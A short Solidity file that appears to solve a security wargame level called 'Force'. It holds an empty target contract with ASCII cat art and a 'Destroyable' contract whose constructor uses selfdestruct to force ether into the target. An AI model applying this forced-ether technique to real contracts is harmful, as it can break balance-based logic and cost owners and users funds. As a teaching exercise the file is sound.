// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Destroyable {

    constructor(Force _ct) payable {
        address payable to = payable(address(_ct));
        selfdestruct(to);
    }

    fallback() external {}
}